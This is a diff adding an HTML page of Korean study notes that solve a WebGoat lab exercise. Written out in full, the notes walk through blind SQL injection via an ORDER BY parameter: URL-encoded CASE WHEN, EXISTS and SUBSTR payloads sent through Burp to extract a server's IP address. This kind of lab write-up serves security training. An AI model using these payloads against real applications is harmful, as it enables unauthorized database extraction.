@@ -1,0 +1,55 @@
+
+<h1>8</h1>
+<div>
+    Q) webgoat-prd 서버의 ip 주소를 확보해라.
+    ip 주소의 일부는 xxx.130.219.202 
+</div>
+<div>
+    A) 
+    표의 컬럼들을 클릭해보면 오름차순으로 order by를 해주고 있음
+    history를 보면 column 이라는 변수에 담아서 전송해주고 있음
+    
+    대충 쿼리를 상상하면
+    SELECT HOSTNAME, IP, MAC, STATUS, DESCRIPTION
+    FROM SERVERS
+    WHERE ???
+    ORDER BY xxx
+
+    따라서 xxx에 (case when length('test') = 4 then id else mac end) 를 넣어서 어떻게 동작하는지 확인
+    히스토리에서 전송된 줄 중 하나를 선택해서 Repeater로 전송하고 column란에 위의 서브쿼리를 입력
+    이때 띄어쓰기등은 인코딩을 해줘야하므로 구글에 검색해서 url encoding 하는 곳에서 변경해주고 넣어야함
+    최종 넣어야할 값은 (case+when+length('test')%3d4+then+id+else+mac+end)
+    Go를 눌러서 반응을 볼 수 있는데 (case+when+length('test')%3d5+then+id+else+ip+end) 이렇게
+    거짓을 주고 다른 컬럼과 비교했을때 리턴되는 데이터가 다른걸 알 수 있음
+
+    참일 경우 id로 정렬, 거짓일 경우 이상하게 정렬되서 나옴
+    내장함수도 동작한다는걸 알 수 있음
+
+    (case+when+exists(select+*+from+servers+where+hostname%3d'webgoat-prd')%3d5+then+id+else+ip+end)
+    위의 서브쿼리 중 exists라는 내장함수를 통해 webgoat-prd가 존재하는지 확인(인코딩 필수)
+
+    우연찮게 틀린 쿼리를 주니까
+    [select id, hostname, ip, mac, status, description from servers  where status &lt;&gt; &#39;out of order&#39; order by (case when exists(SELECT * FROM SERVERS WHERE HOSTNAME = &#39;webgoat-prd&#39;)=5 then id else ip end)]
+    select 쿼리를 알게되버림
+
+    (case+when+exists(select+*+from+servers+where+hostname%3d'webgoat-prd')+then+id+else+ip+end)
+    이렇게 해야 정상적으로 나오고 true가 리턴됐다는걸 id로 정렬된 데이터가 리턴됐다는 걸보고 알 수 있음
+    따라서 webgoat-prd 라는 데이터는 존재함
+
+    (case+when+exists(select+*+from+servers+where+hostname%3d'webgoat-prd'+and+substr(ip,1,1)%3d'1')+then+id+else+ip+end)
+    substr를 통해 ip시작 글자가 1이 있는지 확인하는 서브쿼리 실행
+    마찬가지로 true로 리턴됨
+
+    하나씩 앞자리 숫자를 변경해서 해도 되고, 난 intruder를 썼는데 하나씩 봐야하네 어차피 ..
+    1-1
+    0-2
+    4-3
+    1-5     
+    3-6
+    2-9
+    1-10
+    ...
+    
+    따라서 앞의 자리숫자는 104라는걸 알 수 있음
+    
+</div>
